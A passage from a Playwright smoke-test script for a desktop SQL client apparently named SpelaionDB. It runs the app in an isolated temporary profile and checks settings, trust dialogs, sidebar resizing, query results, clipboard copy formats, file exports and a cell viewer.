// Smoke test of the real app: starts it with the WebView2 debugging port open and drives it
// with Playwright (CDP). It uses examples/demo and a temporary personal directory, so it does
// not touch the user's configuration or keychain.
//
// Requirements: the app built (npx tauri build --no-bundle) and the CLI (cargo build --release
// -p spelaion-cli, for the MCP activity steps), examples/demo/make-shop-db.py
// run and, for the PostgreSQL steps, testing/docker up.
//   node e2e/smoke.mjs [screenshots-dir]

import { execFileSync, spawn } from "node:child_process";
import assert from "node:assert/strict";
import { once } from "node:events";
import { createServer } from "node:net";
import { createCipheriv } from "node:crypto";
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { chromium } from "playwright-core";

const root = resolve(import.meta.dirname, "../../..");
const exe = process.env.SPELAION_E2E_EXE ?? join(root, "target/release/spelaion-desktop" + (process.platform === "win32" ? ".exe" : ""));
const demo = join(root, "examples/demo");
const shots = resolve(process.argv[2] ?? join(import.meta.dirname, "screenshots"));
const userDir = mkdtempSync(join(tmpdir(), "spelaion-e2e-"));
const port = 9333;
// The MCP page's AI clients: their files under this folder, and a stand-in for the CLI.
const clientsHome = join(userDir, "ai-clients");
const fakeCli = join(userDir, process.platform === "win32" ? "spelaiondb.exe" : "spelaiondb");
writeFileSync(fakeCli, "");
const editSmokeComplete = Symbol("edit smoke complete");
mkdirSync(shots, { recursive: true });

/** A local port nothing listens on right now. */
async function freePort() {
  const server = createServer();
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  const { port } = server.address();
  server.close();
  await once(server, "close");
  return port;
}

function startApp() {
  return spawn(exe, [demo], {
    env: {
      ...process.env,
      SPELAION_USER_DIR: userDir,
      WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS: `--remote-debugging-port=${port}`,
      // Its own WebView2 profile: an installed SpelaionDB that is open (same app identifier)
      // would otherwise share it and the second webview fails to start.
      WEBVIEW2_USER_DATA_FOLDER: join(userDir, "webview2"),
      // kubectl only ever sees the test cluster (or nothing), never the user's clusters.
      KUBECONFIG: process.env.SPELAION_TEST_K8S ?? join(userDir, "no-kubeconfig"),
      // No request to GitHub for updates: the run must not depend on the network (ADR-021).
      SPELAION_NO_UPDATES: "1",
      // The MCP page never reads or writes the user's AI clients' files (ADR-033).
      SPELAION_MCP_CLIENTS_HOME: clientsHome,
      SPELAION_CLI: fakeCli,
    },
    stdio: "inherit",
  });
}

let app = startApp();

/** Runs `spelaiondb mcp` as an AI client would (stdio, JSON-RPC): `list_connections`, then each
 *  call, as the client "smoke-agent". Needs `cargo build --release -p spelaion-cli`. */
async function agentSession(calls) {
  const cli = join(root, "target/release/spelaiondb" + (process.platform === "win32" ? ".exe" : ""));
  if (!existsSync(cli)) throw new Error(`${cli} is missing: run cargo build --release -p spelaion-cli`);
  const agent = spawn(cli, ["mcp", "--workspace", demo], {
    env: { ...process.env, SPELAION_USER_DIR: userDir },
    stdio: ["pipe", "pipe", "inherit"],
  });
  let buffer = "";
  const waiting = new Map();
  agent.stdout.setEncoding("utf8");
  agent.stdout.on("data", (chunk) => {
    buffer += chunk;
    let newline;
    while ((newline = buffer.indexOf("\n")) >= 0) {
      const message = JSON.parse(buffer.slice(0, newline));
      buffer = buffer.slice(newline + 1);
      waiting.get(message.id)?.(message);
    }
  });
  let next = 1;
  const request = (method, params) =>
    new Promise((done, fail) => {
      const id = next++;
      const timer = setTimeout(() => fail(new Error(`${method}: no answer`)), 30_000);
      waiting.set(id, (message) => {
        clearTimeout(timer);
        if (message.error) fail(new Error(`${method}: ${JSON.stringify(message.error)}`));
        else done(message.result);
      });
      agent.stdin.write(JSON.stringify({ jsonrpc: "2.0", id, method, params }) + "\n");
    });
  await request("initialize", { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "smoke-agent", version: "1.0" } });
  agent.stdin.write(JSON.stringify({ jsonrpc: "2.0", method: "notifications/initialized" }) + "\n");
  for (const [name, args] of [["list_connections", {}], ...calls]) {
    await request("tools/call", { name, arguments: args });
  }
  agent.stdin.end();
  await once(agent, "exit");
}

async function stopApp() {
  if (app.exitCode !== null || app.signalCode !== null) return;
  const exited = once(app, "exit");
  app.kill();
  await exited;
}

/** Closes the app like its window's close button (WM_CLOSE), so its exit code runs. */
async function closeApp() {
  const exited = once(app, "exit");
  execFileSync("taskkill", ["/PID", String(app.pid)], { stdio: "ignore" });
  const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error("the app did not close")), 15_000));
  await Promise.race([exited, timeout]);
}

/** `kubectl` processes started with the test cluster's kubeconfig. */
function testKubectls() {
  const out = execFileSync(
    "powershell",
    ["-NoProfile", "-Command", "Get-CimInstance Win32_Process -Filter \"Name='kubectl.exe'\" | ForEach-Object { $_.CommandLine }"],
    { encoding: "utf8" },
  );
  const kubeconfig = process.env.SPELAION_TEST_K8S.replaceAll("\\", "/").toLowerCase();
  return out.split(/\r?\n/).filter((line) => line.replaceAll("\\", "/").toLowerCase().includes(kubeconfig));
}

async function connect() {
  for (let i = 0; i < 60; i++) {
    try {
      return await chromium.connectOverCDP(`http://127.0.0.1:${port}`);
    } catch {
      await new Promise((r) => setTimeout(r, 500));
    }
  }
  throw new Error("the app did not open the debugging port");
}

let failed = false;
// The demo's shop.toml is changed during the run (ADR-022) and always put back.
const shopFile = join(demo, ".spelaion", "connections", "shop.toml");
const shopOriginal = readFileSync(shopFile, "utf8");
let browser = await connect();
try {
  let page = browser.contexts()[0].pages()[0];
  page.setDefaultTimeout(30_000);
  const shot = (name) => page.screenshot({ path: join(shots, `${name}.png`) });
  const step = (text) => console.log(`· ${text}`);

  async function newQuery(connection, sql) {
    await page.locator(`.connection-row:has-text("${connection}") button[title="New query"]`).click();
    const panel = page.locator(".tab-panel:not([hidden])");
    await panel.locator(".status-connecting").waitFor({ state: "detached" });
    await panel.locator(".cm-content").click();
    // insertText does not trigger autocompletion (Enter would accept a suggestion).
    await page.keyboard.insertText(sql);
    return panel;
  }
  async function run(panel) {
    await panel.locator(".cm-content").click();
    await page.keyboard.press("Control+Shift+Enter");
  }
  async function replaceQuery(panel, sql) {
    await panel.locator(".cm-content").click();
    await page.keyboard.press("Control+A");
    await page.keyboard.insertText(sql);
  }
  async function waitForHistoryCount(count) {
    await page.waitForFunction((expected) => document.querySelectorAll(".history-entry").length === expected && document.querySelector(".history-entries")?.getAttribute("aria-busy") === "false", count);
  }
  // The history preference lives in the connection's "⋯" menu in the sidebar.
  async function connectionMenu(connection) {
    await page.locator(`.connection-row:has-text("${connection}") .connection-menu > button`).click();
    return page.locator(".connection-menu-popup");
  }
  async function historySaving(connection) {
    const menu = await connectionMenu(connection);
    const checked = await menu.getByRole("checkbox", { name: `Save query history for ${connection}`, exact: true }).isChecked();
    await page.keyboard.press("Escape");
    await menu.waitFor({ state: "detached" });
    return checked;
  }
  async function setHistorySaving(connection, enabled, screenshot) {
    const menu = await connectionMenu(connection);
    const checkbox = menu.getByRole("checkbox", { name: `Save query history for ${connection}`, exact: true });
    if (await checkbox.isChecked() !== enabled) await checkbox.click();
    await page.waitForFunction((expected) => {
      const input = document.querySelector('.connection-menu-popup input[type="checkbox"]');
      return input?.checked === expected && !input.disabled;
    }, enabled);
    if (screenshot) await shot(screenshot);
    await page.keyboard.press("Escape");
    await menu.waitFor({ state: "detached" });
  }
  // Opens a settings category in the settings dialog, runs `action` and closes the dialog:
  // the tabs behind it are left as they were.
  const CATEGORY = { appearance: 1, language: 2, explorer: 3, connections: 4, types: 5, history: 6, network: 7, scripts: 9 };
  async function withSettings(category, action) {
    await page.locator(".activity-bar .settings-button").click();
    const dialog = page.locator(".settings-dialog");
    await dialog.waitFor();
    await dialog.locator(`.settings-nav button:nth-child(${CATEGORY[category]})`).click();
    await action(dialog.locator(".settings"));
    await dialog.locator(".wizard-header button").click();
    await dialog.waitFor({ state: "detached" });
  }
  async function setLanguage(value) {
    await withSettings("language", async (settings) => {
      await settings.locator(`input[name="language"][value="${value}"]`).click();
      await page.waitForFunction((expected) => {
        const input = document.querySelector(`input[name="language"][value="${expected}"]`);
        return input?.checked && !input.matches(":disabled") && document.documentElement.lang === expected;
      }, value);
    });
  }
  async function setTheme(value, expected) {
    await withSettings("appearance", async (settings) => {
      await settings.locator(`input[name="theme"][value="${value}"]`).click();
      await page.waitForFunction(([v, theme]) => {
        const input = document.querySelector(`input[name="theme"][value="${v}"]`);
        return input?.checked && !input.matches(":disabled") && document.documentElement.dataset.theme === theme;
      }, [value, expected]);
    });
  }
  async function savedLanguage() {
    let value = null;
    await withSettings("language", async (settings) => {
      await settings.locator('input[name="language"]:checked:not(:disabled)').waitFor();
      value = await settings.locator('input[name="language"]:checked').getAttribute("value");
    });
    return value;
  }

  step("startup and untrusted repository");
  await page.locator(".activity-bar .settings-button").waitFor();
  assert.equal(await page.locator(".language-setting").count(), 0, "the language selector left the tab bar");
  assert.equal(await savedLanguage(), "system");
  await page.evaluate(() => {
    Object.defineProperty(navigator, "languages", { configurable: true, value: ["es-ES"] });
    window.dispatchEvent(new Event("languagechange"));
  });
  await page.waitForFunction(() => document.documentElement.lang === "es-ES");
  await page.evaluate(() => {
    Object.defineProperty(navigator, "languages", { configurable: true, value: ["fr-FR"] });
    window.dispatchEvent(new Event("languagechange"));
  });
  await page.waitForFunction(() => document.documentElement.lang === "en");
  await setLanguage("es");
  await page.getByText("Selecciona una conexión a la izquierda o abre una consulta nueva.").waitFor();
  await page.getByRole("button", { name: "Configuración", exact: true }).waitFor();
  const spanishActivities = page.getByRole("navigation", { name: "Barra de actividades" });
  await spanishActivities.getByRole("button", { name: "Conexiones", exact: true }).waitFor();
  await spanishActivities.getByRole("button", { name: "Historial de consultas", exact: true }).waitFor();
  await setLanguage("en");
  await page.getByText("Shop (SQLite)").waitFor();
  await page.getByText("is not trusted").waitFor();
  await shot("01-start");

  step("Kubernetes editor requires repository trust before listing");
  await (await connectionMenu("Shop (SQLite)")).getByRole("button", { name: "Edit…" }).click();
  let trustDialog = page.getByRole("dialog", { name: "Trust this repository?" });
  await trustDialog.waitFor();
  await trustDialog.getByRole("button", { name: "Don't trust" }).click();
  await page.locator(".modal.wizard").waitFor({ state: "detached" });
  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  const untrustedWizard = page.locator(".modal.wizard");
  await untrustedWizard.locator(".engine-card", { hasText: "PostgreSQL" }).click();
  await untrustedWizard.getByRole("tab", { name: "Kubernetes" }).click();
  const kubeCheckbox = untrustedWizard.getByRole("checkbox", { name: "Connect through kubectl port-forward" });
  await kubeCheckbox.click();
  trustDialog = page.getByRole("dialog", { name: "Trust this repository?" });
  await trustDialog.waitFor();
  await trustDialog.getByRole("button", { name: "Don't trust" }).click();
  assert.equal(await kubeCheckbox.isChecked(), false);
  await untrustedWizard.getByRole("button", { name: "Cancel" }).click();
  await untrustedWizard.waitFor({ state: "detached" });

  step("connections sidebar: drag, keyboard resizing, limits and reset");
  const sidebar = page.locator(".sidebar");
  const activities = page.getByRole("navigation", { name: "Activity bar" });
  assert.deepEqual(await activities.getByRole("button").evaluateAll((buttons) => buttons.map((button) => button.getAttribute("aria-label"))), ["Connections", "Processes", "Query history", "Saved queries", "MCP server", "Settings"]);
  for (const button of await activities.getByRole("button").all()) assert.ok(await button.getAttribute("title"));
  const connectionsActivity = activities.getByRole("button", { name: "Connections" });
  assert.equal(await connectionsActivity.getAttribute("aria-pressed"), "true");
  await connectionsActivity.click();
  await sidebar.waitFor({ state: "hidden" });
  assert.equal(await connectionsActivity.getAttribute("aria-pressed"), "false");
  await connectionsActivity.click();
  await sidebar.waitFor({ state: "visible" });
  assert.equal(await connectionsActivity.getAttribute("aria-pressed"), "true");
  const sidebarResizer = page.getByRole("separator", { name: "Resize the connections panel" });
  const sidebarBox = await sidebar.boundingBox();
  const handleBox = await sidebarResizer.boundingBox();
  const mainBox = await page.locator(".main").boundingBox();
  assert.equal(Math.round(sidebarBox.width), 290);
  assert.equal(Math.round(sidebarBox.x + sidebarBox.width), Math.round(mainBox.x));
  assert.equal(Math.round(handleBox.x), Math.round(mainBox.x));
  assert.equal(Math.round(handleBox.width), 6);
  await page.mouse.move(handleBox.x + handleBox.width / 2, handleBox.y + 100);
  await page.mouse.down();
  await page.mouse.move(handleBox.x + handleBox.width / 2 + 120, handleBox.y + 100, { steps: 5 });
  await page.mouse.up();
  assert.equal(Math.round((await sidebar.boundingBox()).width), 410);
  assert.equal(await sidebarResizer.getAttribute("aria-valuenow"), "410");
  await connectionsActivity.click();
  await sidebar.waitFor({ state: "hidden" });
  await connectionsActivity.click();
  await sidebar.waitFor({ state: "visible" });
  assert.equal(Math.round((await sidebar.boundingBox()).width), 410);
  await sidebarResizer.focus();
  await page.keyboard.press("ArrowLeft");
  assert.equal(Math.round((await sidebar.boundingBox()).width), 400);
  await page.keyboard.press("Home");
  assert.equal(Math.round((await sidebar.boundingBox()).width), 210);
  await page.keyboard.press("End");
  assert.equal(Math.round((await sidebar.boundingBox()).width), Number(await sidebarResizer.getAttribute("aria-valuemax")));
  assert.ok((await page.locator(".main").boundingBox()).width >= 360);
  await sidebarResizer.dblclick();
  assert.equal(Math.round((await sidebar.boundingBox()).width), 290);

  step("settings: a dialog over the tabs, Ctrl+, opens it and Escape closes it");
  const tabsWithoutSettings = await page.locator(".tabbar [role=tab]").count();
  await page.keyboard.press("Control+,");
  const settingsDialog = page.getByRole("dialog", { name: "Settings" });
  await settingsDialog.getByRole("heading", { name: "Appearance" }).waitFor();
  for (let i = 0; i < 20; i++) {
    await page.keyboard.press("Tab");
    assert.ok(await settingsDialog.evaluate((dialog) => dialog.contains(document.activeElement)), "Tab stays in the modal");
  }
  assert.equal(await page.locator(".tabbar [role=tab]").count(), tabsWithoutSettings, "no settings tab");
  assert.equal(await page.locator(".activity-bar .settings-button").getAttribute("aria-pressed"), "true");
  // Updates (ADR-021): switched off for this run (SPELAION_NO_UPDATES), so it says so and
  // asks nothing.
  await settingsDialog.getByRole("button", { name: "Updates", exact: true }).click();
  await settingsDialog.getByRole("heading", { name: "Updates" }).waitFor();
  await settingsDialog.getByText(/^Version \d+\.\d+\.\d+$/).waitFor();
  await settingsDialog.getByRole("status").filter({ hasText: "not available in this build" }).waitFor();
  assert.equal(await page.locator(".update-notice").count(), 0, "no update notice");
  await page.keyboard.press("Escape");
  await settingsDialog.waitFor({ state: "detached" });
  await page.locator(".activity-bar .settings-button").click();
  await settingsDialog.getByRole("button", { name: "History", exact: true }).click();
  await settingsDialog.getByRole("button", { name: "Open query history" }).click();
  await settingsDialog.waitFor({ state: "detached" });
  await page.getByRole("complementary", { name: "Query history", exact: true }).waitFor();
  await page.getByRole("button", { name: "Close query history" }).click();
  const systemTheme = await page.evaluate(() => (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light"));
  assert.equal(await page.locator("html").getAttribute("data-theme"), systemTheme);
  await setTheme("dark", "dark");
  await withSettings("appearance", async () => {
    await shot("01a-settings-dark");
  });
  await setTheme("light", "light");

  step("trust the repository");
  await page.getByRole("button", { name: "Review and trust" }).click();
  await page.getByRole("dialog").getByText("Trust this repository?").waitFor();
  await shot("02-trust");
  await page.getByRole("button", { name: "Trust", exact: true }).click();

  step("SQLite: aggregation");
  let panel = await newQuery(
    "Shop (SQLite)",
    "select c.country, count(*) as orders, round(sum(o.total), 2) as total\nfrom orders o\njoin customer c on c.id = o.customer_id\ngroup by c.country\norder by total desc;",
  );
  const editorDivider = panel.getByRole("separator", { name: "Resize editor and results" });
  assert.equal(await editorDivider.getAttribute("aria-valuenow"), "42");
  await editorDivider.focus();
  await page.keyboard.press("ArrowDown");
  assert.equal(await editorDivider.getAttribute("aria-valuenow"), "44");
  await page.keyboard.press("Home");
  assert.equal(await editorDivider.getAttribute("aria-valuenow"), "12");
  await page.keyboard.press("End");
  assert.equal(await editorDivider.getAttribute("aria-valuenow"), "85");
  await editorDivider.dblclick();
  assert.equal(await editorDivider.getAttribute("aria-valuenow"), "42");
  await run(panel);
  await panel.locator(".statusline", { hasText: "6 rows" }).waitFor();
  step("SQL keywords remain legible when switching themes");
  const keywords = panel.locator(".cm-content .sql-keyword");
  await keywords.first().waitFor();
  const lightKeywordColor = await keywords.first().evaluate((el) => getComputedStyle(el).color);
  assert.equal(lightKeywordColor, "rgb(119, 0, 136)");
  await setTheme("dark", "dark");
  assert.equal(await keywords.first().evaluate((el) => getComputedStyle(el).color), "rgb(199, 146, 234)");
  await shot("03-grid-dark");
  await setTheme("light", "light");
  assert.equal(await keywords.first().evaluate((el) => getComputedStyle(el).color), lightKeywordColor);
  await panel.locator(".cm-content").click();
  await page.keyboard.press("Control+f");
  const searchInput = panel.locator('.cm-search input[name="search"]');
  await searchInput.fill("country");
  await setLanguage("es");
  assert.equal(await searchInput.inputValue(), "country");
  assert.equal(await searchInput.getAttribute("aria-label"), "Buscar");
  await panel.locator('.cm-search button[name="next"]', { hasText: "siguiente" }).waitFor();
  await panel.getByRole("textbox", { name: "Editor SQL" }).waitFor();
  await panel.locator(".statusline", { hasText: "6 filas" }).waitFor();
  await page.getByRole("tab", { name: /Consulta 1/ }).waitFor();
  await shot("03-espanol");
  await setLanguage("en");
  await panel.locator('.cm-search button[name="close"]').click();
  await panel.locator(".cm-content").click();
  await page.keyboard.press("Control+Alt+g");
  const gotoInput = panel.locator('.cm-goto-line input[name="line"]');
  await gotoInput.fill("3");
  await setLanguage("es");
  await panel.locator(".cm-goto-line label", { hasText: "Ir a la línea" }).waitFor();
  assert.equal(await gotoInput.inputValue(), "3");
  await setLanguage("en");
  await panel.locator(".cm-goto-line .cm-dialog-close").click();
  await shot("03-sqlite");

  step("copy: selection as TSV, with headers and as JSON (formatted by the core)");
  // Capture what goes to the clipboard instead of touching the system one.
  await page.evaluate(() => {
    window.__copied = [];
    navigator.clipboard.writeText = (text) => {
      window.__copied.push(text);
      return Promise.resolve();
    };
    // HTML copies go through write(): what is kept is the HTML.
    navigator.clipboard.write = async (items) => {
      window.__copied.push(await (await items[0].getType("text/html")).text());
    };
  });
  const copied = async (count) => {
    await page.waitForFunction((n) => window.__copied.length === n, count);
    return page.evaluate(() => window.__copied[window.__copied.length - 1]);
  };
  // The grid is a canvas: what it draws is read back as pixels (CSS coordinates).
  const pixel = (target, x, y) =>
    target.locator(".grid-canvas").evaluate((canvas, [x, y]) => {
      const dpr = window.devicePixelRatio || 1;
      const d = canvas.getContext("2d").getImageData(Math.round(x * dpr), Math.round(y * dpr), 1, 1).data;
      return `${d[0]},${d[1]},${d[2]}`;
    }, [x, y]);
  // Pixels of a rectangle that differ clearly from its top-left one (text, a checkbox…).
  const inked = (target, x0, y0, x1, y1) =>
    target.locator(".grid-canvas").evaluate((canvas, [x0, y0, x1, y1]) => {
      const dpr = window.devicePixelRatio || 1;
      const ctx = canvas.getContext("2d");
      const d = ctx.getImageData(Math.round(x0 * dpr), Math.round(y0 * dpr), Math.round((x1 - x0) * dpr), Math.round((y1 - y0) * dpr)).data;
      let count = 0;
      for (let i = 0; i < d.length; i += 4) {
        if (Math.abs(d[i] - d[0]) + Math.abs(d[i + 1] - d[1]) + Math.abs(d[i + 2] - d[2]) > 60) count++;
      }
      return count;
    }, [x0, y0, x1, y1]);
  // The longest time between two painted frames while `action` runs: the UI must not freeze.
  async function longestFrameGap(action) {
    await page.evaluate(() => {
      window.__gaps = [];
      window.__gapsOn = true;
      let last = performance.now();
      const tick = (now) => {
        window.__gaps.push(now - last);
        last = now;
        if (window.__gapsOn) requestAnimationFrame(tick);
      };
      requestAnimationFrame(tick);
    });
    const started = Date.now();
    await action();
    const elapsed = Date.now() - started;
    const gap = await page.evaluate(() => {
      window.__gapsOn = false;
      return Math.round(Math.max(0, ...window.__gaps));
    });
    return { elapsed, gap };
  }
  async function setGridLook(look) {
    await withSettings("appearance", async (settings) => {
      for (const [name, on] of Object.entries(look)) {
        const box = settings.locator(`input[name="${name}"]`);
        if ((await box.isChecked()) !== on) await box.click();
        await page.waitForFunction(([n, v]) => {
          const input = document.querySelector(`input[name="${n}"]`);
          return input?.checked === v && !input.matches(":disabled");
        }, [name, on]);
      }
    });
  }
  const grid = panel.locator(".grid-scroller");
  const gridBox = await grid.boundingBox();
  // First data cell: below the 36 px header, right of the row numbers.
  await page.mouse.click(gridBox.x + 80, gridBox.y + 36 + 13);
  await page.keyboard.press("Control+a");
  await page.keyboard.press("Control+c");
  const all = (await copied(1)).trimEnd().split("\n");
  assert.equal(all.length, 6);
  assert.equal(all[0].split("\t").length, 3);
  await page.mouse.click(gridBox.x + 80, gridBox.y + 36 + 13);
  await page.keyboard.press("Shift+ArrowDown");
  await page.keyboard.press("Shift+ArrowDown");
  await page.keyboard.press("Shift+ArrowRight");
  await page.keyboard.press("Control+Shift+c");
  const withHeaders = (await copied(2)).trimEnd().split("\n");
  assert.deepEqual(withHeaders[0].split("\t"), ["country", "orders"]);
  assert.equal(withHeaders.length, 4);
  await page.mouse.click(gridBox.x + 80, gridBox.y + 36 + 13, { button: "right" });
  await panel.getByRole("menuitem", { name: "Copy ▸" }).hover();
  await panel.getByRole("menuitem", { name: "Copy as JSON" }).waitFor();
  await shot("03b-copy-menu");
  await panel.getByRole("menuitem", { name: "Copy as JSON" }).click();
  const json = JSON.parse(await copied(3));
  assert.equal(json.length, 3);
  assert.equal(typeof json[0].orders, "number");
  assert.ok(json[0].country);
  await panel.getByRole("status").filter({ hasText: "Copied 3 rows × 2 columns" }).waitFor();
  await page.mouse.click(gridBox.x + 80, gridBox.y + 36 + 13);
  await page.mouse.click(gridBox.x + 80, gridBox.y + 36 + 13, { button: "right" });
  await panel.getByRole("menuitem", { name: "Copy ▸" }).hover();
  await panel.getByRole("menuitem", { name: "Copy as Markdown table" }).click();
  const markdown = (await copied(4)).trimEnd().split("\n");
  assert.equal(markdown[0], "| country |");
  assert.equal(markdown[1], "| --- |");
  assert.equal(markdown.length, 3);
  await panel.getByRole("status").filter({ hasText: "Copied 1 row × 1 column" }).waitFor();
  await page.mouse.click(gridBox.x + 80, gridBox.y + 36 + 13);
  await page.keyboard.press("Shift+ArrowDown");
  await page.keyboard.press("Shift+ArrowDown");
  await page.mouse.click(gridBox.x + 80, gridBox.y + 36 + 13, { button: "right" });
  await panel.getByRole("menuitem", { name: "Copy ▸" }).hover();
  await panel.getByRole("menuitem", { name: "Copy as SQL IN list" }).click();
  assert.match(await copied(5), /^\('[^']+', '[^']+', '[^']+'\)$/);
  await page.mouse.click(gridBox.x + 80, gridBox.y + 36 + 13, { button: "right" });
  await panel.getByRole("menuitem", { name: "Copy ▸" }).hover();
  await panel.getByRole("menuitem", { name: "Copy as SQL INSERT" }).click();
  const tuples = json.map((row) => `('${row.country.replaceAll("'", "''")}')`).join(",\n  ");
  assert.equal(await copied(6), `INSERT INTO table_name (country) VALUES ${tuples};\n`);

  step("export: the loaded result, every row run again with CSV options, and a selection");
  // The native save dialog cannot be driven: src/dialogs.ts takes this path instead.
  const exportPath = (name) => join(userDir, name);
  const answerSaveDialog = (path) => page.evaluate((target) => (window.__spelaionSavePath = target), path);
  /** Opens the export dialog from `open`, picks the format, lets `setup` change the rest,
   *  exports to `path` and returns the dialog's last message. */
  const exportWith = async (open, title, format, path, setup) => {
    await answerSaveDialog(path);
    await open();
    const dialog = page.getByRole("dialog", { name: title });
    await dialog.waitFor();
    await dialog.getByRole("combobox", { name: /^Format/ }).selectOption(format);
    if (setup) await setup(dialog);
    await dialog.getByRole("button", { name: "Export…" }).click();
    const message = dialog.locator(".export-result");
    await message.waitFor();
    const text = await message.innerText();
    await shot(`03c-export-${format}`);
    await dialog.getByRole("button", { name: "Close" }).last().click();
    await dialog.waitFor({ state: "detached" });
    await page.evaluate(() => delete window.__spelaionSavePath);
    return text;
  };
  const openResultExport = () => panel.locator(".export-button").getByRole("button", { name: "Export…" }).click();
  assert.match(await exportWith(openResultExport, "Export result", "csv", exportPath("result.csv")), /^Exported 6 rows to /);
  const csv = readFileSync(exportPath("result.csv"), "utf8");
  assert.ok(csv.startsWith("\ufeffcountry,orders,total\r\n"), csv.slice(0, 40));
  assert.equal(csv.trimEnd().split("\r\n").length, 7);
  await exportWith(openResultExport, "Export result", "json", exportPath("result.json"));
  const exported = JSON.parse(readFileSync(exportPath("result.json"), "utf8"));
  assert.equal(exported.length, 6);
  assert.equal(typeof exported[0].total, "number");
  await exportWith(openResultExport, "Export result", "markdown", exportPath("result.md"));
  const md = readFileSync(exportPath("result.md"), "utf8").trimEnd().split("\n");
  assert.equal(md.length, 8);
  assert.equal(md[1], "| --- | ---: | ---: |");
  // Every row: the query runs again in a new session and streams to the file, with a
  // semicolon, plain UTF-8 and no header.
  const streamed = await exportWith(openResultExport, "Export result", "csv", exportPath("streamed.csv"), async (dialog) => {
    await dialog.getByRole("radio", { name: "Every row: run the query again" }).check();
    await dialog.getByText("It runs again in a new session").waitFor();
    await dialog.getByRole("combobox", { name: /^Delimiter/ }).selectOption(";");
    await dialog.getByRole("checkbox", { name: "Column names as the first row" }).uncheck();
    await dialog.getByRole("combobox", { name: /^Encoding/ }).selectOption("utf8");
  });
  assert.match(streamed, /^Exported 6 rows to /);
  const streamedLines = readFileSync(exportPath("streamed.csv"), "utf8").trimEnd().split("\r\n");
  assert.equal(streamedLines.length, 6);
  assert.deepEqual(streamedLines.map((line) => line.split(";").length), [3, 3, 3, 3, 3, 3]);
  assert.ok(!streamedLines[0].startsWith("\ufeff"));
  // A selection: its rows and its columns, from the grid's menu.
  {
    const grid = await panel.locator(".grid-scroller").boundingBox();
    await page.mouse.click(grid.x + 80, grid.y + 36 + 13);
    await page.keyboard.press("Shift+ArrowDown");
    await page.keyboard.press("Shift+ArrowRight");
    const openSelection = async () => {
      await page.mouse.click(grid.x + 80, grid.y + 36 + 13, { button: "right" });
      await panel.getByRole("menuitem", { name: "Export selection…" }).click();
    };
    const selected = await exportWith(openSelection, "Export selection", "tsv", exportPath("selection.tsv"));
    assert.match(selected, /^Exported 2 rows to /);
    const tsv = readFileSync(exportPath("selection.tsv"), "utf8").replace(/^\ufeff/, "").trimEnd().split("\n");
    assert.equal(tsv[0], "country\torders");
    assert.equal(tsv.length, 3);
  }

  step("cell viewer: pretty JSON, hex dump of bytes, full text");
  panel = await newQuery(
    "Shop (SQLite)",
    "select json_object('a', json_array(1, 2)) as doc, x'48656c6c6f00ff' as raw, 'line 1' || char(10) || 'line 2' as txt;",
  );
  await run(panel);
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  const viewerToggle = panel.getByRole("button", { name: "Cell value panel" });
  const closedToggleBox = await viewerToggle.boundingBox();
  const closedGridBox = await panel.locator(".grid-scroller").boundingBox();
  assert.ok(closedToggleBox.x >= closedGridBox.x + closedGridBox.width, "the viewer control is to the right of the grid");
  await viewerToggle.click();
  const viewer = panel.getByRole("complementary", { name: "Cell value" });
  await viewer.getByText("Select a cell to see its value.").waitFor();
  assert.ok((await viewerToggle.boundingBox()).x >= (await viewer.boundingBox()).x + (await viewer.boundingBox()).width, "the viewer control stays to the right of the open panel");
  assert.equal(await viewerToggle.getAttribute("aria-pressed"), "true");
  const viewerResize = panel.getByRole("separator", { name: "Resize cell value panel" });
  const beforeWidth = (await viewer.boundingBox()).width;
  const resizeBox = await viewerResize.boundingBox();
  await page.mouse.move(resizeBox.x + resizeBox.width / 2, resizeBox.y + resizeBox.height / 2);
  await page.mouse.down();
  await page.mouse.move(resizeBox.x - 80, resizeBox.y + resizeBox.height / 2, { steps: 5 });
  await page.mouse.up();
  const wider = (await viewer.boundingBox()).width;
  assert.ok(wider > beforeWidth + 50, `drag should widen the viewer: ${beforeWidth} → ${wider}`);
  await viewerResize.focus();
  await page.keyboard.press("ArrowRight");
  const narrower = (await viewer.boundingBox()).width;
  assert.ok(narrower < wider, `keyboard should resize the viewer: ${wider} → ${narrower}`);
  await viewerToggle.click();
  await viewer.waitFor({ state: "detached" });
  assert.equal(await viewerToggle.getAttribute("aria-pressed"), "false");
  await viewerToggle.click();
  await viewer.getByText("Select a cell to see its value.").waitFor();
  assert.ok(Math.abs((await viewer.boundingBox()).width - narrower) < 2, "the viewer keeps its width after toggling");
  const viewerGrid = await panel.locator(".grid-scroller").boundingBox();
  await page.mouse.click(viewerGrid.x + 80, viewerGrid.y + 36 + 13);
  await viewer.locator(".cell-viewer-json").waitFor();
  assert.equal(await viewer.locator(".cell-viewer-value").innerText(), '{\n  "a": [\n    1,\n    2\n  ]\n}');
  await page.keyboard.press("ArrowRight");
  await viewer.locator(".cell-viewer-hex", { hasText: "48 65 6c 6c 6f 00 ff" }).waitFor();
  assert.match(await viewer.locator(".cell-viewer-value").innerText(), /^00000000 {2}48 65 6c 6c 6f 00 ff .* {2}Hello\.\.$/);
  await viewer.getByText("7 bytes").waitFor();
  await shot("03d-cell-viewer");
  await page.keyboard.press("ArrowRight");
  await viewer.locator(".cell-viewer-text").waitFor();
  assert.equal(await viewer.locator(".cell-viewer-value").innerText(), "line 1\nline 2");
  // The row view lists every column; picking one goes back to that cell.
  await viewer.getByRole("button", { name: "Row", exact: true }).click();
  await viewer.locator(".row-field").nth(2).waitFor();
  assert.deepEqual(await viewer.locator(".row-field dt").allInnerTexts(), ["doc TEXT", "raw BLOB", "txt TEXT"]);
  assert.equal(await viewer.locator(".row-field dd").nth(1).innerText(), "\\x48656c6c6f00ff");
  await shot("03e-row-view");
  await viewer.getByRole("button", { name: "Show the value of doc" }).focus();
  await page.keyboard.press("Enter");
  await viewer.locator(".cell-viewer-json").waitFor();
  await page.keyboard.press("Escape");
  await viewer.waitFor({ state: "detached" });

  step("grid menu and filter submenu stay visible near the window edges");
  await setHistorySaving("Shop (SQLite)", false);
